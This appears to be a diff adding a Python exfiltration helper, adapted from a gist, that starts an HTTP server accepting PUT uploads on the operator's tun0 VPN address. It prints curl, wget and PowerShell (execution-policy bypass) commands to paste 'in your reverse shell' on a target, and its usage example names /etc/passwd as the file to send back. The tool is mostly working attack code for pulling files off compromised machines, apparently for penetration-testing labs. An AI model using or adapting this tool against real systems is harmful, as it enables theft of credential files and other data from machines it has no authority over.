@@ -1,0 +1,90 @@
+#!/usr/bin/env python3
+
+"""
+Source: https://gist.github.com/darkr4y/761d7536100d2124f5d0db36d4890109
+Extend Python's built in HTTP server to save files
+curl or wget can be used to send files with options similar to the following
+  curl -X PUT --upload-file somefile.txt http://localhost:8000
+  wget -O- --method=PUT --body-file=somefile.txt http://localhost:8000/somefile.txt
+__Note__: curl automatically appends the filename onto the end of the URL so
+the path can be omitted.
+
+Modified by @the-c0d3r, added commands to be copy pasted on target, handling of path.
+"""
+
+import os
+import http.server as server
+
+from pathlib import Path
+
+
+class HTTPRequestHandler(server.SimpleHTTPRequestHandler):
+    """Extend SimpleHTTPRequestHandler to handle PUT requests"""
+    def do_PUT(self):
+        """Save a file following a HTTP PUT request"""
+        global path_to_put, file_to_put
+
+        filename = os.path.basename(file_to_put)
+        filepath = path_to_put / filename
+        file_length = int(self.headers['Content-Length'])
+
+        with open(filepath, 'wb') as output_file:
+            output_file.write(self.rfile.read(file_length))
+        self.send_response(201, 'Created')
+        self.end_headers()
+        reply_body = 'Saved "%s"\n' % filepath
+        self.wfile.write(reply_body.encode('utf-8'))
+        self.close_connection = True
+
+
+def get_tun0_ip():
+    command = "ip addr show tun0 | grep 'inet ' | awk '{print $2}' | cut -d'/' -f 1"
+    import subprocess
+    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    out, err = process.communicate()
+    ip = out.decode().strip()
+    print(f"IP Detected: {ip}")
+    if ip == "":
+        print("Unable to detect IP, probably tun0 interface not found")
+        ip = input("Enter your IP: ")
+    return ip
+
+
+def print_commands(ip, file_to_put):
+    print("=== LINUX")
+    print(f"curl -X PUT --upload-file {file_to_put} http://{ip}/")
+    print("")
+    print(f"wget -O- --method=PUT --body-file={file_to_put} http://{ip}/")
+    print("")
+
+    print("=== WINDOWS")
+    print(f"powershell -ep bypass -c \"$wc=New-Object Net.WebClient;$wc.UploadFile('http://{ip}/', 'PUT', '{file_to_put}');\"")
+
+    print("\n")
+
+
+
+if __name__ == '__main__':
+    import sys
+    if len(sys.argv) < 3:
+        print("Usage: putsrv file_to_put_from_server path_to_put_on_local")
+        print("e.g.:\n\t putsrv /etc/passwd .")
+        exit
+    else:
+        global path_to_put, file_to_put
+        file_to_put = Path(os.path.abspath(sys.argv[1]))
+        path_to_put = Path(os.path.abspath(sys.argv[2]))
+
+        filename = os.path.basename(file_to_put)
+
+        ip = get_tun0_ip()
+        print(f"File to PUT: {file_to_put}")
+        print(f"Path to PUT: {path_to_put}")
+        print("\n")
+
+        print_commands(ip, file_to_put)
+        print("-" * 32)
+        print("Copy the command above and paste it in your reverse shell to upload the file.\n")
+
+        server.test(HandlerClass=HTTPRequestHandler, port="80")
+
